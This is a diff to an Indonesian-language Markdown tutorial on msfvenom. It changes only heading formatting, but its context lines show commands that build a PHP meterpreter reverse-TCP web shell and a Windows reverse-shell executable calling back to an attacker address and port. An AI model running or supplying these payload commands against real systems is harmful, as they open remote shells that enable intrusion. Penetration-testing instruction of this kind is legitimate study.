@@ -13,7 +13,7 @@
 msfvenom -p <PAYLOAD> LHOST=<IP_ATTACKER> LPORT=<PORT_LISTENER> -f <FORMAT_OUTPUT> -o <NAMA_FILE>
 ```
 
-**Keterangan**:
+Keterangan:
 
 | Parameter | Fungsi |
 |:--:|:--:|
@@ -80,7 +80,7 @@ Output-nya cocok untuk disisipkan dalam exploit `C` manual.
 
 ## H. Membuat Web Payload (PHP/ASP/JSP)
 
-**Contoh Payload PHP:**
+Contoh Payload PHP:
 
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php
@@ -94,7 +94,7 @@ Untuk menghindari karakter tertentu seperti `\x00\x0a`, bisa tambahkan:
 -b "\x00\x0a"
 ```
 
-**Contoh:**
+Contoh:
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -b "\x00\x0a" -f exe -o filtered_shell.exe
